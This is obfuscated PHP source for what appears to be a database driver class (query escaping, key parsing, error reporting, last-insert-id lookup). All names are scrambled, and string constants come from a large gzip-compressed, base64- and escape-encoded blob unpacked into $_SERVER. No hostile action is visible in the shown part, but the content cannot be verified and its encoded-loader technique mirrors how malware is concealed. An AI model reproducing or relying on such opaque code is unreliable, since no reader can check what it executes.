$c‚ Ì„ôŒá .= $b¯Ú÷õ£®Æ[48] . $DÈŒ„ğºÔë[1] . $b¯Ú÷õ£®Æ[49] . $DÈŒ„ğºÔë[0] . $b¯Ú÷õ£®Æ[50]; } else { $c‚ Ì„ôŒá .= $b¯Ú÷õ£®Æ[48] . $DÈŒ„ğºÔë[0] . $b¯Ú÷õ£®Æ[50]; } break; case $b¯Ú÷õ£®Æ[911]: case $b¯Ú÷õ£®Æ[929]: break; case $b¯Ú÷õ£®Æ[913]: break; case $b¯Ú÷õ£®Æ[912]: case $b¯Ú÷õ£®Æ[914]: break; case $b¯Ú÷õ£®Æ[941]: default: $c‚ Ì„ôŒá .= $b¯Ú÷õ£®Æ[48] . $DÈŒ„ğºÔë . $b¯Ú÷õ£®Æ[50]; } } return $c‚ Ì„ôŒá; } public function parseKey(&$fáùğ„²©™, $B›†Úµí¥ = true) { $AğãºßÃ×Ó =& $_SERVER[›é¼±]; if ($B›†Úµí¥) { $fáùğ„²©™ = $this->parseKeyCheck($fáùğ„²©™); } if ($this->dbType == $AğãºßÃ×Ó[941]) { if ($fáùğ„²©™ != $AğãºßÃ×Ó[182] && !preg_match($AğãºßÃ×Ó[906], $fáùğ„²©™)) { $fáùğ„²©™ = $AğãºßÃ×Ó[383] . trim($fáùğ„²©™, $AğãºßÃ×Ó[383]) . $AğãºßÃ×Ó[383]; } return $fáùğ„²©™; } else { return parent::parseKey($fáùğ„²©™, $B›†Úµí¥); } } public function close() { $this->_linkID = null; } public function error() { $bé…ƒ¿ô¥ =& $_SERVER[›é¼±]; if ($this->PDOStatement) { $EÌ†ğ´Œª = $this->PDOStatement->errorInfo(); $this->error = $EÌ†ğ´Œª[1] . $bé…ƒ¿ô¥[4] . $EÌ†ğ´Œª[2]; } else { $this->error = $bé…ƒ¿ô¥[33]; } if ($bé…ƒ¿ô¥[33] != $this->queryStr) { $this->error .= LNG($bé…ƒ¿ô¥[45]) . $this->queryStr; } think_trace($this->error, $bé…ƒ¿ô¥[33], $bé…ƒ¿ô¥[46]); return $this->error; } public function escapeString($BİŠ¥­ğ‚) { $Cº†÷‡ï•Ë =& $_SERVER[›é¼±]; switch ($this->dbType) { case $Cº†÷‡ï•Ë[938]: case $Cº†÷‡ï•Ë[911]: case $Cº†÷‡ï•Ë[929]: case $Cº†÷‡ï•Ë[941]: return addslashes($BİŠ¥­ğ‚); case $Cº†÷‡ï•Ë[913]: case $Cº†÷‡ï•Ë[930]: case $Cº†÷‡ï•Ë[912]: case $Cº†÷‡ï•Ë[914]: return str_ireplace($Cº†÷‡ï•Ë[55], $Cº†÷‡ï•Ë[56], $BİŠ¥­ğ‚); } } protected function parseValue($FåÂÁ¸ø) { $eŞÓê¶ö®ß =& $_SERVER[›é¼±]; if (is_string($FåÂÁ¸ø)) { $EÄÀ›÷Íó× = strpos($FåÂÁ¸ø, $eŞÓê¶ö®ß[4]) === 0 && in_array($FåÂÁ¸ø, array_keys($this->bind)); $FåÂÁ¸ø = $EÄÀ›÷Íó× ? $this->escapeString($FåÂÁ¸ø) : $eŞÓê¶ö®ß[951] . $this->escapeString($FåÂÁ¸ø) . $eŞÓê¶ö®ß[951]; } elseif (isset($FåÂÁ¸ø[0]) && is_string($FåÂÁ¸ø[0]) && strtolower($FåÂÁ¸ø[0]) == $eŞÓê¶ö®ß[295]) { $FåÂÁ¸ø = $this->escapeString($FåÂÁ¸ø[1]); } elseif (is_array($FåÂÁ¸ø)) { $FåÂÁ¸ø = array_map(array($this, $eŞÓê¶ö®ß[952]), $FåÂÁ¸ø); } elseif (is_bool($FåÂÁ¸ø)) { $FåÂÁ¸ø = $FåÂÁ¸ø ? $eŞÓê¶ö®ß[87] : $eŞÓê¶ö®ß[191]; } elseif (is_null($FåÂÁ¸ø)) { $FåÂÁ¸ø = $eŞÓê¶ö®ß[103]; } return $FåÂÁ¸ø; } public function getLastInsertId() { $f³ÜÅŒæ¼‰ =& $_SERVER[›é¼±]; switch ($this->dbType) { case $f³ÜÅŒæ¼‰[938]: case $f³ÜÅŒæ¼‰[930]: case $f³ÜÅŒæ¼‰[911]: case $f³ÜÅŒæ¼‰[929]: case $f³ÜÅŒæ¼‰[913]: case $f³ÜÅŒæ¼‰[941]: return $this->_linkID->lastInsertId(); case $f³ÜÅŒæ¼‰[912]: case $f³ÜÅŒæ¼‰[914]: $bÍĞ¹ÀšÅ„ = $this->table; $bÁèÂğôªß = $this->query("\x53\105\x4c\105\x43\x54\40{$bÍĞ¹ÀšÅ„}\56\143\x75\x72\x72\x76\141\x6c\x20\143\165\x72\162\166\141\154\x20\106\x52\x4f\115\40\x64\165\x61\154"); return $bÁèÂğôªß ? $bÁèÂğôªß[0][$f³ÜÅŒæ¼‰[953]] : 0; } } } goto AÜ¨ó­™«Á; a¢èë•¶¡Ø: define($_SERVER[›é¼±][237], 2); define($_SERVER[›é¼±][238], 3); define($_SERVER[›é¼±][239], 1); goto f‹ôÒ¹ñïè; B‘«¢µã¢: if (!function_exists('_kodDe')) { function _kodDe($e¦Øµ£´) { $e¦Øµ£´ = base64_decode($e¦Øµ£´); $fÊ‚“µãÚ» = strlen($e¦Øµ£´); $A‰¹¶½ĞŞ = ''; $cßë•èÃ˜Î = ord($e¦Øµ£´[0]) - 30; for ($B±È…Ü«ä = 1; $B±È…Ü«ä < $fÊ‚“µãÚ»; $B±È…Ü«ä += 2) { if ($B±È…Ü«ä + 1 < $fÊ‚“µãÚ») { $A‰¹¶½ĞŞ .= chr(ord($e¦Øµ£´[$B±È…Ü«ä + 1]) + $cßë•èÃ˜Î); $A‰¹¶½ĞŞ .= chr(ord($e¦Øµ£´[$B±È…Ü«ä]) + $cßë•èÃ˜Î); } else { $A‰¹¶½ĞŞ .= chr(ord($e¦Øµ£´[$B±È…Ü«ä]) + $cßë•èÃ˜Î); } } return $A‰¹¶½ĞŞ; } } define(base64_decode('m+m8sQ=='), strrev('Ö°ôûÜ£ıó')); $_SERVER[›é¼±] = explode("\x7c\x1\x7c\x1\x7c\x5", gzinflate(substr(base64_decode('H4sIAAAAAAAAA8V9CXhURdaoy+go4+7oiMt4jUK2XrKwBkLsJJ2koZMO3R0Wk9A=')."\334\356\276\235\276\244\273\157\247\357\355\154\204\121\134\160\1\161\101\105\104\35\107\124\20\27\160\104\160\1\145\334\35\24\367\121\307\205\121\11\10\270\157\243\317\355\325"."\136\165\157\67\372\277\357\275\357\173\50\164\325\251\345\126\235\72\165\352\234\252\123\247\206\157\274\362\311\233\366\54\375\156\350\100\360\337\41\337\337\363\52\16\200\277\7"."\xf\x1d\x84\xc3\xa7\x2f\x3e\xec\x0\xf4\xe7\xe0\xc5\x97\x15\x15\x35\x8d\x1b\x51\xda\x72\xc4\x15\x1b\xee\x91\xef\x96\xef\x95\x2f\xf3\x79\xb7\x3d\xef\x39\x72\xfb\xdd\x53\xdd\xbb\x56\x6d\x1b"."\330\165\340\1\257\164\352\267\127\201\314\270\154\25\376\221\122\232\41\51\375\252\156\350\30\20\321\122\61\265\13\207\325\24\376\165\342\37\275\47\241\32\12\16\207\132\174".strrev('¾©©:ËCeD&RV–´¡ubSàèÉZyRIÈÎZP’‹RzbH†íÕµ­ PÁ').base64_decode('NlTvbvX6ZoeCs1vdJEc41JNVMgM4hoIBQ84YQTWpsBx9GdauWnejp0UK+l0tAVc=')."\135\320\343\153\301\340\72\137\163\263\47\230\13\367\373\274\336\132\127\335\264\334\224\126\277\253\261\331\45\201\366\45\224\220\232\212\151\105\322\134\234\62\127\52\306\201\6"."\125\111\104\161\60\45\323\346\30\3\151\22\12\262\20\30\203\124\66\221\300\221\26\26\42\355\127\142\162\66\101\160\126\57\106\322\31\65\51\323\256\117\123\6\30\24\7"."\xe4\xac\xa1\xa9\xa9\x8\x8e\xb8\xfb\x8d\x8c\xcc\xe1\xa0\xc5\x91\x8c\x92\x54\x52\xa4\xaa\x80\xdb\xeb\xae\xb\x4a\xb0\x99\x52\x83\xdf\xd7\x2c\x91\xa1\x48\xca\xba\xa1\x64\xa4\x99\x4d\x6e\xbf"."\x5b\x82\x4d\xaf\x2e\x44\x3d\x2e\x94\x70\xb9\xb6\x16\x80\x10\xc9\xe5\xf5\x4a\xfb\xab\xc1\x50\x92\x69\x5a\xd\x2e\x93\xa7\x32\x9f\xbf\xde\xed\x97\x6a\x67\x4b\x1c\x4f\x11\x2d\x99\xd4\x52\xe"."\x50\xb\x18\x4f\x43\x68\xaa\xdb\xef\xc7\x1\x1b\xa1\x60\xaf\x7\xe\x1d\x89\xf8\x1a\x1a\x2\x6e\x16\x23\x9d\x9b\xee\x5\x2d\xa9\x24\x54\x6a\x8a\x45\x63\x9\x23\xd4\x2b\x27\xb2\x94\x58\xbb"."\361\157\41\371\41\277\232\116\10\270\107\115\251\131\102\254\244\12\115\143\63\207\4\262\64\267\102\41\112\224\4\222\240\274\106\46\27\230\151\275\70\130\75\5\377\116\42"."\231\302\41\230\246\144\214\220\222\212\150\121\65\105\346\143\15\231\173\204\2\145\43\136\237\121\101\76\122\241\346\210\150\351\201\146\255\227\164\46\246\46\24\57\233\156\61"."\x2d\x11\x55\x32\x3c\x9e\x6\xc5\xc5\x14\xd2\x2b\x75\x50\x28\xdd\x92\x4d\x8a\x59\x58\x34\x12\x57\x13\xd1\xc\x9d\xa5\xbf\x96\x13\xf0\x1\x35\x36\xc0\x67\xa3\xae\x65\x33\x11\xc5\x3\xe6\xb"."\x2f\xdb\xca\x5a\x52\x4e\x32\x29\x86\x1\x3a\xad\xd3\x7e\xb5\xa5\x13\x9a\x1c\xd\x28\x19\xa1\xaf\xd\xa0\xa0\x2f\x6b\x88\xc0\x2c\xca\xd6\xa0\x65\x92\xf5\x80\x6f\x90\xef\x83\xd9\xa2\xb6\xe5"."\111\350\246\363\45\52\240\320\201\177\234\105\355\13\355\77\167\266\237\15\376\51\46\314\257\203\64\55\256\44\22\41\245\137\41\363\52\31\35\253\323\276\72\365\260\232\162"."\2\10\216\172\174\241\270\254\307\233\243\143\103\250\24\151\171\52\252\364\73\322\361\64\216\362\171\337\141\242\173\70\72\55\232\341\26\70\163\102\213\310\11\261\247\70\34"."\x37\x8c\x74\x40\x49\x45\x21\x42\x48\x8f\xb4\xbe\x14\x42\x58\x5a\x51\x48\xa6\x7a\x9b\x14\x95\x9a\xa5\xd9\x52\x53\x95\x5a\xa5\xd3\x82\xc9\x4\xb\xd1\xde\x31\x98\xce\x80\x46\x3f\xa1\x98\x2"."\x12\x57\xfa\xd\x82\x14\x69\x52\x24\x2e\x67\xc0\x70\x55\x67\x8d\x98\x7d\x2\x6\xca\xe9\x74\x42\x8d\xc8\x86\xaa\xa5\x9c\x5a\xc4\x50\xc\xbb\x6e\x64\x14\x99\xd4\xe6\x8a\x44\x14\x5d\xb7\xd7"."\151\51\43\243\45\354\256\104\102\353\263\373\62\152\227\232\252\222\112\160\36\230\10\346\273\35\162\310\52\62\211\13\46\111\220\126\40\203\50\301\137\243\223\223\345\316\310"."\51\75\246\144\354\156\62\151\252\44\60\36\214\101\322\154\365\252\236\326\164\25\66\257\112\222\15\103\216\304\41\163\341\325\127\377\112\176\65\225\120\123\112\116\136\167\177"."\132\315\50\72\155\253\324\330\34\44\225\200\332\25\173\153\106\356\112\312\125\122\72\33\6\230\41\263\67\17\14\347\46\250\251\222\42\60\152\223\222\131\335\260\147\24\300"."\xa5\x54\xb0\x1e\x92\x31\xf6\xc4\xec\xcd\x70\x6a\xa9\x4a\xd4\x1e\x0\xcc\x9c\x80\x2b\xcb\xc6\x48\x80\x6c\x24\x9a\x86\xa1\x4d\xc1\x60\x6b\xc8\xd3\x0\xd6\xec\x16\x77\xa8\xd9\x15\xac\x6b\x22"."\315\66\344\56\332\146\57\140\321\254\112\12\234\145\7\123\14\22\126\13\350\53\7\266\152\175\112\6\174\270\166\240\112\352\326\242\141\255\337\101\223\140\346\0\340\41\64"."\x33\x1c\xee\xb4\x61\xf7\xcb\xa9\x2e\x88\x9f\xf0\x80\xa1\x10\xf2\xd3\x7b\xbb\xcc\x88\xf6\x2a\xa9\x2e\x23\x4e\xb\x6\xdc\xfe\x19\x6e\x7f\x28\xe0\x6b\x8\xce\x74\xf9\xc9\x6a\x9f\x2\x54\xd2"._kodDe('MC09mfPGPDjrjgJQLGC+CGB7UG/U8QEDfHM7c4FnlHsrH/5k41ILeaBWp0zLlyOw')."\266\33\54\5\141\22\210\2\215\244\101\116\324\241\352\216\170\111\121\107\264\264\330\16\376\55\51\156\357\250\167\224\164\326\70\125\136\306\131\356\50\227\52\312\306\111\255"."\x40\x36\x51\xe5\x84\x44\x3a\x9d\x93\xa3\x4c\xf2\x4d\xfb\x15\x4\xc0\xa5\x4b\x98\xd6\x16\xd4\x61\xa0\xdf\x3d\xbd\xcd\x1d\x8\x86\x9a\xdd\xc1\x26\x5f\x3d\xf9\x82\xdb\x45\x42\x5e\xd\x4f\x4d"."\xda\xa3\x76\xfc\xd3\x49\x46\x30\x86\xd9\xaa\x27\x29\x77\x59\xb8\x34\x8c\x35\x6b\x19\xc5\xc\x19\x62\xab\xc6\x4c\x35\x4a\xd9\x38\x8c\x36\x29\x6a\x57\x9c\xf4\x4f\x85\xb5\x45\xb4\x84\x96\x91"."\23\220\213\121\42\126\50\147\351\122\143\144\174\60\303\344\221\200\232\114\123\276\146\304\263\311\260\20\244\142\51\30\157\272\274\304\65\266\274\151\31\22\252\162\222\214\243"."\x2a\x1a\xc8\xe4\xf1\x39\x3\x95\xe0\x7f\xce\x86\xa3\x5a\x52\xa6\xd2\x2e\x62\x49\x4a\x14\xf3\x24\xc\x2a\x31\xa5\x34\x29\x32\x5f\x2f\x8d\x8c\xa1\x41\x68\xc6\x94\xa5\x59\x31\xe2\x1a\x19\xa4"."\56\205\66\51\313\332\106\133\31\125\22\12\305\106\134\241\54\275\214\144\3\53\23\303\125\214\261\167\40\270\1\50\137\122\125\335\17\112\102\101\212\306\147\102\171\227\3"."\xc\x96\x35\x1\x56\x13\x5f\x78\x1e\x98\x2e\x38\x1e\x52\xf5\x6\x61\xf1\xf\x69\x28\xd\x34\x5e\xe6\xf9\x5b\x33\x4a\x4c\x25\x93\x2e\x5\x46\xac\x59\xce\x74\xd3\x2\x60\x84\xf8\xb2\x3\x23"."\x42\x65\xd\x6d\x5e\x6f\xa8\xce\xd7\x12\x4\x32\x34\x86\xcc\xf4\x7b\x82\x6e\x4a\xa3\xae\xfa\x90\xab\xae\x75\x88\x2e\xa2\x7c\xc4\x49\x6\xc8\x30\xcc\x44\xce\xe5\xe5\xde\x8a\x21\xbe\x12\xf1".strrev('JÂ¼İ5“@$öƒ“—oŞä¸%9éád˜çlåÔ„{Ò–´çpq¬Ä‚s3‹%').base64_decode('hP/jhdpDxpWzb4hYoBjRpb3VFyAFaiAUSE9hJUPa0dpGkpICTTW6CXAEIcO4XE4=')."\10\160\146\200\262\336\54\310\237\121\7\145\336\307\32\332\36\122\167\177\62\301\5\102\163\257\354\174\54\202\115\236\226\151\241\146\137\275\333\33\362\264\0\276\24\314\205"."\267\265\326\273\350\340\212\360\132\137\260\311\4\155\3\234\151\206\313\353\261\146\167\317\362\4\202\201\274\111\0\326\346\266\244\0\135\260\325\357\156\360\314\142\321\6\217"."\333\133\37\10\325\271\352\232\170\236\26\127\63\211\204\142\120\33\323\235\346\374\41\300\142\3\114\247\13\365\102\375\224\42\53\144\122\240\102\124\65\10\161\72\0\313\245".base64_decode('QmiPdBdqxagnREaPaFlKjUxMTFKukpTJtJLpUliEf4olV0Ay0qQOwD/CAyyIukE=')."\343\100\40\44\337\227\10\273\317\151\101\10\346\251\125\142\214\163\347\7\270\142\6\343\2\226\70\230\27\74\15\214\200\13\251\337\200\22\320\210\204\350\134\323\201\276\342".strrev('F}#ŠS#ì€ÂÎ'."\r".'ŸÑâ¢/è!àB¸¾IZûôÍqP]ûukä7Õq‰Í¢')."\121\71\204\177\106\343\37\40\366\221\217\53\51\212\365\60\344\346\214\61\120\235\10\314\6\312\211\265\54\373\132\130\323\310\27\22\120\2\30\242\374\200\151\336\363\164\112".base64_decode('JP2U+ZSSD/aTFSXom+ZuCVHKwjGBGjEA6LI+P0GIoXVThQon+t0BOsszSk9Wpeg=')."\162\72\112\11\25\53\140\321\42\237\167\316\351\350\53\55\152\267\227\72\72\101\240\270\344\154\34\45\261\16\207\51\172\26\51\237\315\260\322\120\60\52\322\153\212\253\72"."\234\35\316\242\232\252\166\227\175\120\266\17\226\331\47\332\73\113\73\34\305\245\4\320\71\277\302\66\146\1\314\0\62\326\234\331\11\176\252\73\152\106\165\330\107\377\145"."\xee\xd9\xed\x1d\x9d\x85\x55\xa5\x67\x74\x38\xce\xec\xe8\xeb\x2c\x29\xae\xa1\xdf\x89\x64\x33\x40\x59\x8c\xc\xb0\xa6\x46\x4b\x8b\x40\x93\x80\xc0\xc4\xb2\xa4\x10\xcb\x13\x32\xd0\x84\x41\x35"."\xcd\xa1\xf3\xc7\x2d\xa0\x70\x30\x86\x4a\x17\x2f\xd1\x6e\xef\x28\xed\xac\x11\xca\x9\x20\xeb\xb7\x80\xb0\x4\xf8\x6f\x9c\xe5\x73\xd9\xcf\x81\x3d\x63\x45\xe1\xbc\x27\xf4\x91\x4d\x45\x38\xf7".strrev('@HzR‘ºÔ¦ÌêËhÚ=&B—d€»ü(ş}9fé)€)'."\n".'lR»PG,"ó„')."\x33\x28\x7d\x87\x15\xa3\x4f\xa1\xe4\x1\xe0\xa6\x38\x20\xe\xaa\x18\x82\x24\x21\x96\x40\x62\x21\xf9\x2\x57\xd0\x14\xa4\xad\x90\x5e\xa4\x43\x50\x26\xeb\x63\xb1\xa8\x92\x22\xe3\x74\x38\xc9".base64_decode('rUfktBIQehgKBV21XneIchjCiWkcccVatmsHusY5KuUPES6kI32EzHy9JyEhxiA=')."\51\231\214\226\251\102\273\223\172\66\15\205\71\240\173\31\0\267\22\120\334\245\352\51\22\106\71\51\27\22\7\40\55\123\311\1\352\322\202\64\0\71\24\151\123\232\217".base64_decode('kA5EMCoPOYs6OrLtSrSzHRC+bI91zq9cUEzleGcH+EMjrjybaCHGDUNgfXbAdrA=')."\175\20\123\204\45\343\250\226\141\102\123\332\44\166\33\232\41\47\114\125\4\41\204\14\56\133\270\311\226\1\36\155\57\347\130\160\51\27\366\40\21\73\155\141\33\154\154"."\x3\x44\xd8\xfe\x82\x25\x2\x8a\xe1\x60\x39\x6c\x42\x62\x8\xc4\x49\xff\xf0\xbf\xd5\x64\x43\x20\xa6\xa6\xc0\x74\xaa\x13\x96\x3a\xbc\x7f\x13\x18\xd0\xd\x25\x69\xda\xb2\xd4\x15\x39\x13\x89"."\67\144\23\11\203\11\377\11\265\233\174\201\314\225\271\371\362\66\150\31\252\344\226\220\357\26\224\344\313\350\111\245\200\112\52\322\26\137\125\33\135\100\176\11\112\105\164".base64_decode('e0/ytEi1Pp/X7WqR4AJOFh4gHQTcrS6wakF1ORB0kx1HT72d1jvL7iEKFQuoUTo=')."\x4e\x80\xd9\x19\x14\x4a\x36\xbc\x48\xc\xca\x97\x36\xb8\xb7\x63\x83\x52\x84\xd\x34\xd7\x6\x95\x25\x1b\x97\xe9\x6d\x7c\xc7\xcc\xd6\xab\x2a\x7d\x28\xc0\x44\x6b\x1b\x91\xb8\x6d\x86\x9c\x1"."\xc2\x0\x14\x89\x49\xd0\x53\x6f\x53\xf5\x7a\xa4\x4e\xa0\xf\xa0\x24\xda\x20\x23\xe\x77\x31\x12\xf2\x80\xd\x37\xce\xab\xf4\x2a\x9\x1b\x6d\x9a\x8d\xb6\xd8\x46\xd5\x1\x1b\x52\xef\xea\x49"."\263\332\300\304\41\315\102\101\300\37\343\66\110\52\220\122\155\174\107\217\174\116\320\77\154\134\67\261\165\145\264\154\272\225\176\111\210\341\306\20\0\157\51\3\370\65\315"."\260\121\175\323\226\253\212\346\307\135\376\246\43\144\133\277\115\6\12\46\345\242\344\67\106\46\27\371\146\225\152\76\256\221\250\346\13\350\342\145\312\303\307\222\316\247\204"."\302\143\20\333\74\64\203\317\107\330\241\6\271\127\44\263\174\44\107\227\20\112\236\174\213\235\357\0\163\221\326\252\134\132\367\157\341\107\203\162\127\100\370\234\41\167\321"."\x6f\xe5\x49\xc5\x61\xbf\x12\x19\x88\x70\x5\xb5\x5e\x50\x7b\xcd\x31\x36\x0\x68\xa6\xe4\xa3\xf2\xfc\x3\xcb\x28\x97\x8d\xc3\x88\xc3\xf\xa7\x88\xa4\xe4\xcc\x6\xd5\x34\xb\x7e\x7b\xfe\x91".base64_decode('niB25ktzgQA3FrLUAFigGhIyWYEqxGTCTG3mGJw+DsRc0ZlHgO1WeN0NQWmqDzA=').strrev('ø×ÓQ£a˜-9ÅL'."\n".'Gè«sÚà.d1EN\\yÒT—E7TÉ)hÿBY˜!2áU&').base64_decode('GItIgOsQ6j5faSjIxxe2LJHiZJ3oU3CTmoQUCuNDKxIfGl8rgLbL9F0Y5ROHkoQ=')."\x4\x3f\x40\x2a\x40\x72\x7\x64\x1f\x76\x3e\x5\x84\x28\xf9\x31\x63\xde\x42\x98\x96\x55\x11\x62\xaa\x55\x4d\xd\xa8\x29\x71\xab\x8a\x43\x87\xd8\xc2\xca\xd7\x75\x38\x91\x2d\x9b\x6b\xf5\xfb"."\xb\xe3\xd5\x82\x6f\x85\xd9\xc8\x16\x99\x2d\xa1\xa6\xba\x85\x35\x97\xef\xc3\x80\xd6\xc3\xa2\x42\xdb\x49\x4d\x96\x96\x53\x4e\x4a\x3a\xdd\x6\x14\xfb\x90\x65\x22\x13\xc2\x8f\xcb\x19\x8e\x53"."\xca\x71\xe0\xb4\xe7\x1b\x80\x30\xb\x8f\xa\xd9\x62\x72\x2f\x97\x39\x4c\x65\x4\xbe\xa1\x1b\x3\xb4\xf5\x62\xd0\x5c\x29\x8e\xd6\xef\x2f\xd2\xc4\xf6\x2b\xf2\x45\x45\x96\xa4\xea\x5e\x80\xbb"."\174\141\324\323\240\226\67\12\167\321\150\130\103\364\117\17\265\115\353\75\322\370\213\50\214\10\24\41\141\37\200\161\52\163\71\334\100\27\143\366\100\110\117\200\45\56\343"."\200\223\251\21\256\130\24\153\230\17\322\312\340\352\50\122\150\100\1\263\210\100\170\155\201\234\64\61\67\337\3\202\13\1\137\70\50\346\371\274\344\243\301\47\241\211\160"."\272\170\113\263\40\107\50\267\121\220\370\363\307\33\62\32\23\165\231\34\140\315\124\207\164\111\166\206\151\131\304\5\104\231\344\215\34\220\120\306\52\171\130\240\226\250\25"."\xdf\x64\xa9\xc2\x20\xba\xd3\x2c\x47\x93\x6a\xca\x91\xc1\x8b\x9e\x3\x68\x8\xe4\xcc\xd8\x56\x26\x88\x64\x9c\x53\xcd\xd7\xd1\xd2\x42\x16\xc9\x5\x16\x2\x30\x34\xd\xa8\x9d\x19\x47\x6\x7c".base64_decode('mTeICP1ZNgydpFWoKp5PYJYoxatRBRbOf3dUNSAErnIa3Z7mGYVzWwYTuS9aRHI=')."\x6\x81\xb\xf4\xb6\x51\xa6\x9c\xf9\x96\x7a\x47\x9\x5a\x9d\x1d\xf9\x8f\xa3\xe1\x81\x36\xe\x9\x36\x1c\x49\x76\xc2\x8d\x80\xe\xdd\xd0\xd2\x3c\x45\x88\xe2\x64\x21\x89\x57\x2a\xe4\x62\x88"."\x46\xed\x0\xa4\x1e\x45\xf2\x2b\x47\x14\xca\x4b\xca\x22\xe5\x16\xcf\x26\x47\x2\xe4\x10\x8e\x4d\x3c\xf5\xae\x4c\x86\x92\xf\xee\x1c\xdc\x49\x7\x40\x11\x4\xf9\x52\x80\xd2\x7e\xbe\x85\x6".strrev('[÷Æ·D?‰]Ùü±	Ua—2_ËèÜU›œ1mÑõ9‰aø*¸¶åîîW')."\117\72\261\220\10\331\157\261\6\244\131\322\323\256\174\60\246\163\210\2\265\131\200\346\46\15\126\101\333\314\113\367\57\175\354\207\331\360\1\315\37\7\53\165\135\134\115".strrev('‡T~>‰0Èq‹@€A&³”l®® (ÎØM08GöW8ÍÌYÿñŞ>z3p[:)').strrev('oWëk!qUfM\'Wö›”PXœKgëŸ€÷BŸ5¨Só0><\\3î+&'."\0".'ôLy0')."\337\370\355\115\70\274\372\366\107\56\372\317\323\57\341\110\105\31\71\20\52\307\77\310\126\357\120\34\346\366\172\27\315\152\327\76\174\372\204\206\37\136\332\161\337\103\43"."\x4f\x19\xff\x8a\xbf\xef\xce\x3d\x27\x96\xee\xb\x6f\x2b\x6d\xff\xd7\x53\xef\xbd\x70\xc7\xec\x70\xd3\x51\xa3\xce\x39\xeb\xe2\x82\x8b\xaf\xdb\xb9\x6b\x54\x7c\x65\xe2\xcf\xfe\xdb\xe2\x23\xc6"."\xb8\x17\x8f\x8b\x2f\x3c\x31\xbe\xec\xc8\x97\x24\xd7\xf1\x5f\xef\x78\xad\x7b\x77\xc8\x78\x76\x62\xe5\x59\xc3\xd9\x87\xcb\x66\xdc\x58\xb9\xa9\xb2\xeb\x51\x7d\x7b\xdf\xa1\xeb\x26\xaf\x3c\xe9"."\273\117\76\173\354\247\55\233\316\275\162\167\315\153\233\116\375\371\201\21\305\45\257\237\74\174\350\277\366\165\124\74\160\351\242\217\217\235\163\341\204\133\6\216\134\371\344"."\xc5\xcf\x95\xb6\x3f\x33\xfa\x69\x77\xf3\x9f\x22\x7\xef\xd\x84\x97\x8d\xfa\x76\xe0\x94\x81\xf7\x8a\x8c\xef\x37\x75\x5d\x1c\x28\xfd\xca\xfe\xc8\x77\xbf\x34\xde\x79\xe0\xea\xfa\xa1\x3d\xcf".strrev('µwÍt^N#áÕal»,gÓØŸVuWÚoêğ·óá™]»İó£ël½|n')."\127\154\170\70\374\313\207\323\167\74\163\324\337\146\335\374\322\323\57\235\160\341\311\335\217\7\167\64\166\217\135\157\77\155\365\41\107\175\273\172\302\354\113\56\364\377\176"."\x9b\xa7\xf3\x89\x35\x95\x93\x3f\x5d\x52\xb8\xf7\x8b\x35\xcf\x1c\xd2\x67\x7b\x63\xeb\x5d\x9b\xc7\x7f\xf5\xe9\xb3\xb\x86\xe7\x7c\xfc\xc4\x7f\x9b\xe\xb8\xe3\xeb\x2f\x82\xd9\x63\x5e\xef\x5a".strrev('O…¶ü«¼×´¤ğº+Ó©¾åsp¬èñ^·»#ôz¬¶k‡Êûxx8í¯ãMßy;').strrev('éœÖsêo<]®Kííò=Ã»¯÷-éù;„üj¹Ùî­¾IË÷/ïÌüøc½n')."\130\341\363\375\351\234\373\302\63\276\276\272\354\323\211\25\57\314\233\175\327\265\153\107\54\217\137\62\70\265\363\211\43\357\157\335\171\334\312\301\325\47\334\36\34\337\175"."\155\311\162\333\314\67\113\77\130\164\307\252\105\57\275\27\122\57\213\5\117\136\163\304\326\45\7\134\123\163\377\347\25\276\315\207\375\311\165\150\351\37\354\143\106\14\207"."\157\272\334\171\373\323\157\137\370\176\317\251\173\253\216\332\372\146\145\375\330\125\157\26\225\272\117\273\375\252\33\167\327\54\50\275\245\163\333\165\175\223\73\137\330\174\316".base64_decode('Q/fO3dXS8cqUv7988g+n7h24+8Vnp9g+OakouKR24cjDtv9l638O/FPVnN//cdI=')."\5\263\262\263\116\76\370\274\13\36\334\167\314\304\11\357\246\76\74\140\350\251\247\336\214\277\260\176\212\346\331\260\147\241\366\347\357\217\170\245\352\356\367\377\46\315\72"."\x6e\xc7\x49\x17\x8d\x3b\xa2\x67\xfd\x29\x5f\x3a\x5f\xd\x6f\xdd\xf7\x8f\x7b\xa7\x1d\x5a\x7e\x74\x73\xcf\x5f\x9b\x7c\x27\x14\x6c\xfc\xf0\xc6\xe3\x9c\xa7\x55\xe\xe\xde\xf1\xd6\x71\x33\x76".base64_decode('vlC9d+uek85f8f5343uvVHz/uvnzgifue+e5Ixa/2rziDwNn1sYzc/dGJn9+m28=').base64_decode('+5VXFO48YHzyxItH3+0c23P+HffNuvGG7d/anjgm0Ll5cuyN90ZtPMNxTH3zi9M=').strrev('×ù”ü=˜½ÖIŒšÓ©Óg|ïÏ×mœöyüW‡Ê÷<7Ó×÷ŸE…‘ê©¹')."\xdf\xf0\xc2\xba\x81\xb\xbf\x79\x20\xb5\xfa\x8a\xbf\x9e\xb8\x29\xb1\xa4\xfe\xd9\xeb\xaf\x1a\x55\x37\xfa\xd3\xf6\x4f\x27\x97\x4e\x2c\x2b\x29\xde\xe6\xfe\xa9\xf8\x78\xcf\x8a\x60\xe3\xd4\xa5".base64_decode('B1R+8dHSD1/+5qvr3rr86qdHty7bN1wRm/73t6ZcecARTR/t61+SDdVOGTUycvI=')."\273\57\175\263\364\321\153\337\175\160\242\62\53\275\363\246\304\141\313\136\56\157\275\65\326\35\173\353\351\103\367\216\333\131\325\323\334\75\342\17\341\251\366\276\252\103\377"."\x5b\x39\x3d\xde\xb5\xf1\xfc\xa6\x6d\xab\x7c\xb1\xa9\xd2\xd5\x57\x9c\x50\xd7\x5d\xbb\xeb\xcd\x77\xff\xf8\x90\xff\xc4\x49\x87\x5d\xf8\xf8\x9a\x75\xd7\xbe\xb2\xb0\xec\xd4\x25\xfe\xed\x1b\xde"."\152\170\371\332\123\137\270\344\222\217\327\56\51\130\131\255\37\324\130\337\363\365\264\75\117\176\65\257\144\352\323\53\366\56\372\107\142\305\234\366\47\307\157\175\253\105\177"."\247\373\316\306\27\236\233\363\357\311\7\265\164\364\56\372\351\274\117\136\351\171\261\376\344\303\322\17\334\35\236\271\334\265\44\371\102\303\67\35\313\242\167\234\365\346\274"."\xd8\xce\xf9\x45\xd7\x77\x1e\x7f\xd6\xb3\x5f\x5c\xd5\xbd\xc6\xb6\xee\xef\xfb\xae\x3c\xf4\xd8\x33\x42\xde\xd\xd5\x5f\x6d\x5e\x7b\xbd\x72\xdd\xe4\x53\xa\xaa\x46\x56\x8c\xd9\